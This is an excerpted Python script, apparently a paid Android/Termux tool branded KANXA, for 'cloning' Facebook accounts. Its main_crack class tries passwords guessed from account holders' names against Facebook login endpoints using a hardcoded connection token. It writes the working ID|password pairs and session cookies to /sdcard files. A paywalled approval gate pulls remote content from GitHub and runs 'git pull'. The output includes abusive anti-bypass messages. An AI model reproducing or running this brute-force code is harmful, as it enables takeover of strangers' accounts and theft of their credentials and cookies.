...
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/ARN9VH3R3/Paid-approval/blob/main/Nee.txt'
...
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        ...
        lib = f'https://github.com/ARN9VH3R3/Paid-approval/blob/main/Nee.txt'
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY KANXA');exit()
        else:exit()
    except:exit()   
import os, platform, time, sys
#os.system('pkg install espeak ')
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mKANXA-CHAULAGAI\33[1;91m⊁ ')
...
try:
	prox= requests.get('https://github.com/ARN9VH3R3/Paid-approval/blob/main/Nee.tx').text
...
logo = f"""
 .d8b.  d8888b. d8b   db  .d8b.  db    db 
d8' `8b 88  `8D 888o  88 d8' `8b 88    88 
88ooo88 88oobY' 88V8o 88 88ooo88 Y8    8P 
88~~~88 88`8b   88 V8o88 88~~~88 `8b  d8' 
88   88 88 `88. 88  V888 88   88  `8bd8'  
YP   YP 88   YD VP   V8P YP   YP    YP    x
──────────────────────────────────────────────────────────────────────────
def approval():
  os.system('git pull')
  time.sleep(1)
...
approval()
 ...
 [<>] \033[1;36mSTATUS  :  PAID                                                        
 [<>] \033[1;36mTOOLS   :  FILE                                              
 [<>] \033[1;36mVERSION :  \033[1;32m 2.5\033[1;32m \033[1;37m                          
 
 ──────────────────────────────────────────────────────────────────────────
    """
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 10 DEYS 150rs 30 400rs FOR    APPROVAL""")
...
def meyexudi():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(' \x1b[1;98m║══[2] ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m║══[3] CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m║══[4] WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m║══[5] 15 DAY 250 rs ')
      print(' \x1b[38;5;50m║══[𝟸] 30 DAY 500  ')
      os.system('espeak -a 300 " Hello,   Sir,  NNAAAMMAASSSTTTEEEE,   I,   Am,    Robot,   of,   MR,   KANXA,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[𝟸] YOUR KEY : "+id)
      input(' \033[1;30m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/arnav.H3R3'+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python TAMIM.py")
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back KANXA Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KANXA] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [KANXA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KANXA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KANXA_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [KANXA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/KANXA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KANXA] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [KANXA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KANXA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KANXA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [KANXA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KANXA] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[KANXA] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [KANXA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KANXA_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/KANXA.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/KANXA.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back KANXA Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/KANXA.txt\n') 
        filepath = input("Put File Name: ")
